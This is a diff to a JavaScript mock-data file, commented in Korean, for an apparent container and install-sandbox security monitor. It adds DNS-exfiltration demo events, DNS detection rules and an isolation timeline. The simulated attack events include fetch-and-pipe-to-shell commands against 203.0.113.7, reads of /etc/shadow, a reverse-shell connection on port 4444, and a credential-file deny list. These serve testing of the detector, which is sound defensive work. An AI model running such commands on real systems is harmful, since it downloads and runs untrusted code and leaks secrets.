@@ -24,12 +24,14 @@
       { kind: 'open', comm: 'node', path: '/etc/hosts' },
       { kind: 'connect', comm: 'node', dstIp: '172.18.0.4', dstPort: 5432 },
       { kind: 'connect', comm: 'node', dstIp: '104.16.2.35', dstPort: 443, dstHost: 'api.github.com' },
+      { kind: 'dns', comm: 'node', dstHost: 'api.github.com', qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }, // DNS 질의 [10/30 — 응답은 리졸버 캐시에만, 질의만 이벤트]
     ] },
     { name: 'worker', image: 'python:3.12-slim', attacker: false, normal: [
       { kind: 'exec', comm: 'python3', args: 'python3 -m worker' },
       { kind: 'open', comm: 'python3', path: '/usr/local/lib/python3.12/json/__init__.py' },
       { kind: 'open', comm: 'python3', path: '/tmp/job-queue.lock' },
       { kind: 'connect', comm: 'python3', dstIp: '172.18.0.5', dstPort: 6379 },
+      { kind: 'dns', comm: 'python3', dstHost: 'pypi.org', qtype: 'AAAA', dstIp: '127.0.0.11', dstPort: 53 },
     ] },
     { name: 'pkg-reqeusts', image: 'demo/reqeusts:1.0.2', attacker: true, normal: [
       { kind: 'exec', comm: 'python3', args: 'python3 -c import reqeusts' },
@@ -46,6 +48,13 @@
     { kind: 'open', comm: 'python3', path: '/etc/shadow' },
     { kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 8081, dstHost: 'cdn.reqeusts-update.test' },
     { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444, dstHost: 'cdn.reqeusts-update.test' },
+  ];
+  // DNS 유출 질의 시나리오 [10/30 계약 §2 · §6] — 기존 attack 시드와 따로 둔다(데모 제어 「DNS 유출 질의 지금 실행」 · 설치 dnsExfil · 시연 dns-exfil).
+  //   48자 hex 라벨을 예약 TLD(.example) 아래로 A 질의 + data.exfil.example TXT 질의. 런타임은 runtime-dns-exfil 경고 ×2, 설치 샌드박스는 sandbox-dns 격리 대상(dryRun)
+  const DNS_EXFIL_NAME = 'deadbeef'.repeat(6) + '.exfil.example';
+  const dnsExfil = [
+    { kind: 'dns', comm: 'python3', dstHost: DNS_EXFIL_NAME, qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 },
+    { kind: 'dns', comm: 'python3', dstHost: 'data.exfil.example', qtype: 'TXT', dstIp: '127.0.0.11', dstPort: 53 },
   ];
 
   // ── 기본 정책 (backend/policies/default.yaml)
@@ -66,6 +75,12 @@
       allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8'] },
     { id: 'sandbox-secrets', description: '설치 스크립트가 자격 증명·토큰·설정 파일에 손대면 격리', kind: 'open', action: 'kill', containers: ['sg-install-*'],
       denyPaths: ['/root/.ssh/', '/root/.aws/', '/root/.npmrc', '/root/.pypirc', '/root/.netrc', '/root/.gitconfig', '/root/.docker/', '/run/secrets/'] },
+    // DNS 질의 규칙(kind: dns) [10/30 계약 §1] — 질의만 판정(응답은 리졸버 캐시). 기본 정책 default.yaml 끝의 두 규칙과 같은 값
+    { id: 'runtime-dns-exfil', description: 'DNS 질의로 데이터를 실어 보내는 패턴(긴 라벨 · 긴 이름 · TXT 질의). 런타임은 경고만', kind: 'dns', action: 'alert',
+      maxLabelLength: 40, maxNameLength: 120, denyQtypes: ['TXT'] },
+    { id: 'sandbox-dns', description: '설치 샌드박스는 패키지 레지스트리·GitHub 외 도메인 질의 자체를 격리 (연결 전 유출 · DNS 터널링 차단). sg-vm 실측 전까지 시험 운영', kind: 'dns', action: 'kill', dryRun: true, containers: ['sg-install-*'],
+      allowHosts: ['pypi.org', 'pythonhosted.org', 'registry.npmjs.org', 'registry.yarnpkg.com', 'crates.io', 'static.crates.io', 'github.com', 'githubusercontent.com', 'deb.debian.org', 'dl-cdn.alpinelinux.org'],
+      maxLabelLength: 40 },
     // 시스템 규칙 [10/15 목표] — 차단 목록의 도메인을 집행한다. 정책 화면에서 직접 고치지 않고 차단 목록에서 관리한다
     { id: SYSTEM_RULE, description: '차단 목록의 도메인으로 나가는 연결 (차단 목록에서 관리)', kind: 'connect', action: 'kill', denyHosts: [] },
   ];
@@ -123,8 +138,29 @@
         const dst = host ? `${ip}:${port} (${host})` : `${ip}:${port}`;
         return (r.allowHosts || []).length && !host ? `허용 목록 밖 목적지 ${dst} — 도메인 미확인` : `허용 목록 밖 목적지 ${dst}`;
       }
+      case 'dns': {
+        // DNS 질의 [10/30 계약 §1 매칭 순서] ① denyHosts ② allowHosts 통과 ③ denyQtypes ④ 라벨 길이 ⑤ 이름 길이 ⑥ allowHosts 가 있는데 일치 안 함(점 없는 이름 · *.arpa · *.local · *.internal 제외).
+        //   directIp · 포트 · CIDR 조건은 dns 에 적용하지 않는다. 사유 문구는 백엔드가 만드는 것과 같다
+        const name = (e.dstHost || '').toLowerCase().replace(/\.$/, ''), qtype = String(e.qtype || '').toUpperCase();
+        const nameMatch = (pat) => { pat = String(pat).toLowerCase().replace(/\.$/, ''); return !!name && (name === pat || name.endsWith('.' + pat)); };
+        if ((r.denyHosts || []).some(nameMatch)) return `금지 도메인 질의: ${name} (${qtype})`;
+        if ((r.allowHosts || []).some(nameMatch)) return null;
+        if ((r.denyQtypes || []).some((q) => String(q).toUpperCase() === qtype)) return `금지 질의 유형: ${qtype} — ${name}`;
+        const label = name.split('.').reduce((m, l) => Math.max(m, l.length), 0);
+        if (r.maxLabelLength && label > r.maxLabelLength) return `긴 DNS 라벨(유출 의심): ${name} (라벨 ${label}자 > ${r.maxLabelLength})`;
+        if (r.maxNameLength && name.length > r.maxNameLength) return `긴 DNS 이름(유출 의심): ${name} (${name.length}자 > ${r.maxNameLength})`;
+        if ((r.allowHosts || []).length && name.includes('.') && !/\.(arpa|local|internal)$/.test(name)) return `허용 목록 밖 도메인 질의: ${name} (${qtype})`;
+        return null;
+      }
     }
     return null;
+  }
+  // 격리 타임라인 [10/30 계약 §3] — detectedAt(이벤트 시각) → matchedAt(평가 완료) → evidence(before-kill 훅, 예산 0.7초) → killedAt(Docker kill 응답) → notifiedAt(알림 큐 투입).
+  //   목업 값: 평가 4ms · 증거 런타임 214ms / 설치 700ms(docker top 이 예산을 넘겨 일부만) · kill 38ms · 알림 6ms (evidenceTemplate 의 durationMs 와 같다)
+  function mkTimeline(detectedAt, install) {
+    const t0 = Date.parse(detectedAt) || Date.now(), ev = install ? 700 : 214;
+    const at = (ms) => new Date(t0 + ms).toISOString();
+    return { detectedAt: at(0), matchedAt: at(4), evidenceStartedAt: at(5), evidenceDoneAt: at(5 + ev), killedAt: at(5 + ev + 38), notifiedAt: at(5 + ev + 44) };
   }
 
   // evaluate: 이벤트 → Verdict (enforced 는 파이프라인이 채운다)
@@ -189,8 +225,21 @@
     benign: { pkg: 'requests', manager: 'pip', exitCode: 0, events: pipBase('requests', 'requests') },
     malicious: { pkg: './reqeusts', manager: 'pip', exitCode: 137, events: [...pipBase('/pkg/reqeusts', 'reqeusts').slice(0, 2), ...reqeustsAttack] },
     warn: { pkg: 'tiny-git-dep', manager: 'npm', exitCode: 0, events: tinyGitDep('tiny-git-dep') },
+    // DNS 유출 질의만(SG_DEMO_SCENARIOS=dns-exfil) [10/30] — sandbox-dns 는 시험 운영(dryRun)이라 격리 대상 · 컨테이너는 끝까지 돈다(종료 코드 0)
+    dnsExfil: { pkg: './reqeusts', manager: 'pip', exitCode: 0, events: [...pipBase('/pkg/reqeusts', 'reqeusts').slice(0, 2), ...dnsExfil.map((a) => [a, 1])] },
   };
 
+  // 시연 실행(DEMO_ENABLED) 시나리오 이벤트 [10/30 계약 §2 mock] — 컨테이너 없이 같은 세션 · 같은 이벤트 순서를 모의 재생. 첫 kill 판정에서 멈춘다(실제와 같게)
+  //   shell: exec sh -c "wget … | sh" + open /etc/shadow / revshell: connect 203.0.113.7:4444 / direct-ip: connect 203.0.113.7:443(dstHost 없음) / domain: dns example.com(A) + connect example.com:443 / dns-exfil: 위 dnsExfil / all: 순서대로 전부
+  const DEMO_SCENARIOS = ['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil'];
+  const demoScenarios = {
+    shell: [{ kind: 'exec', comm: 'sh', args: 'sh -c wget -q -O- http://203.0.113.7/postinstall.sh | sh' }, { kind: 'open', comm: 'python3', path: '/etc/shadow' }],
+    revshell: [{ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 4444 }],
+    'direct-ip': [{ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 443 }],
+    domain: [{ kind: 'dns', comm: 'python3', dstHost: 'example.com', qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }, { kind: 'connect', comm: 'python3', dstIp: '203.0.113.34', dstPort: 443, dstHost: 'example.com' }],
+    'dns-exfil': dnsExfil,
+  };
+  const demoEvents = (scenario) => (scenario === 'all' ? DEMO_SCENARIOS.slice(1).flatMap((k) => demoScenarios[k]) : demoScenarios[scenario] || []);
   // 패키지 이름 정규화 (API 계약 「동작 규칙」): 로컬 디렉터리는 마지막 경로 이름, 버전 표기(== · 마지막 @ 뒤)는 뗀다. npm 스코프 @a/b 는 그대로
   function pkgName(raw) {
     let n = String(raw || '').trim();
@@ -213,7 +262,8 @@
       containerId: hexId(r, 64), image: IMAGES[spec.manager],
       startedAt: new Date(startedAt).toISOString(), finishedAt: null, exitCode: null, containerExitedAt: null,
       refusedBy: null, caseId: null,
-      activity: { kinds: { exec: 0, open: 0, connect: 0 }, hosts: [], programs: [] }, violations: [],
+      activity: { kinds: { exec: 0, open: 0, connect: 0, dns: 0 }, hosts: [], programs: [] }, violations: [],
+      isolation: null, // 격리 세션의 첫 kill 판정 { auditId, timeline } [10/30 계약 §3]
     };
   }
   // 세션에 이벤트 n 건을 더한다 — 활동 요약은 정상 · 위반 모두, violations 는 위반만
@@ -252,7 +302,7 @@
       spec.events.forEach(([tpl, n], k) => {
         const e = Object.assign({ timestamp: new Date(started + 300 + k * 120).toISOString(), containerId: s.containerId, containerName: s.container, imageName: s.image, pid: 1000 + Math.floor(seeded() * 30000) }, tpl);
         const v = evaluate(rules, e);
-        if (v.matched && v.action === 'kill' && !v.dryRun) { v.enforced = true; killed = true; }
+        if (v.matched && v.action === 'kill' && !v.dryRun) { v.enforced = true; if (!killed) { v.timeline = mkTimeline(e.timestamp, true); s.isolation = { auditId: null, timeline: v.timeline }; } killed = true; }
         addToSession(s, e, v, n);
       });
       const end = new Date(started + spec.dur * 1000).toISOString();
@@ -283,6 +333,7 @@
     // 최신순, id 는 시간 오름차순이 되도록 다시 매긴다
     rows.sort((a, b) => new Date(a.event.timestamp) - new Date(b.event.timestamp));
     rows.forEach((r, i) => { r.id = i + 1; });
+    for (const s of installs || []) if (s.isolation) { const r = rows.find((x) => x.install && x.install.id === s.id && x.timeline); if (r) s.isolation.auditId = r.id; } // 격리 세션 ↔ 감사 행 [10/30]
     return rows.reverse();
   }
 
@@ -298,6 +349,9 @@
   //   manager 가 비면 차단 목록이 다루지 않는 생태계. 화면은 같은 (manager, name, version) 을 한 줄로 묶고 출처 파일을 나열한다 [10/21 React 맞춤]
   //   repo:requests 의 urllib3 는 1.26.5(두 파일) + 1.23.0(한 파일) — 같은 이름 · 다른 버전은 두 줄
   const P = (name, version, direct, vulns, source, manager = 'pip', ecosystem = 'PyPI') => ({ manager, name, version, ecosystem, source, direct, vulns });
+  // 11/02 sg-vm 실측 — django==2.2.0 (requirements.txt 검사와 같은 값: 75건 · 최고 9.8) · psf/requests 저장소 테스트 코드의 /etc/passwd
+  scanFixtures.osv['own:pip:django@2.2.0'] = [{ package: 'django', version: '2.2.0', ecosystem: 'PyPI', direct: true, count: 75, maxSeverity: '9.8', ids: ['PYSEC-2019-10', 'PYSEC-2019-11'] }];
+  scanFixtures.tests = { 'repo:requests': [{ rule: 'threat-filesystem-read', category: 'threat', message: '민감 파일(자격 증명 · 설정 · 키) 접근', file: 'tests/test_requests.py', line: 1827, match: '/etc/passwd' }] };
   scanFixtures.packages = {
     'requirements.txt': [P('django', '3.2.0', true, 66, 'requirements.txt'), P('urllib3', '1.23.0', false, 24, 'requirements.txt'), P('requests', '2.19.0', true, 10, 'requirements.txt'),
       P('idna', '2.7.0', false, 4, 'requirements.txt'), P('flask', '2.3.3', true, 2, 'requirements.txt'), P('certifi', '2018.4.16', false, 0, 'requirements.txt'), P('chardet', '3.0.4', false, 0, 'requirements.txt')],
@@ -315,5 +369,5 @@
       changes: [{ kind: 'C', path: '/root' }, { kind: 'A', path: '/tmp/p.sh' }, { kind: 'D', path: '/var/log/app.log' }],
       processes: [{ pid: 1, user: 'root', cmd: 'python3 -c import reqeusts' }, { pid: 47, user: 'root', cmd: 'sh -c curl -s http://203.0.113.7/p.sh | sh' }, { pid: 48, user: 'root', cmd: 'curl -s http://203.0.113.7/p.sh' }], partial: false, durationMs: 214, error: '' }),
   };
-  window.MOCK = { scanFixtures, defaultRules, evidenceTemplate, isPublic, containers, attack, rules, SYSTEM_RULE, evaluate, buildAudit, buildInstalls, newSession, addToSession, statusOf, demoSpecs, pkgName, pkgKey, ECOSYSTEM, IMAGES, hexId, seeded };
+  window.MOCK = { scanFixtures, defaultRules, evidenceTemplate, isPublic, containers, attack, dnsExfil, DNS_EXFIL_NAME, mkTimeline, DEMO_SCENARIOS, demoEvents, rules, SYSTEM_RULE, evaluate, buildAudit, buildInstalls, newSession, addToSession, statusOf, demoSpecs, pkgName, pkgKey, ECOSYSTEM, IMAGES, hexId, seeded };
 })();
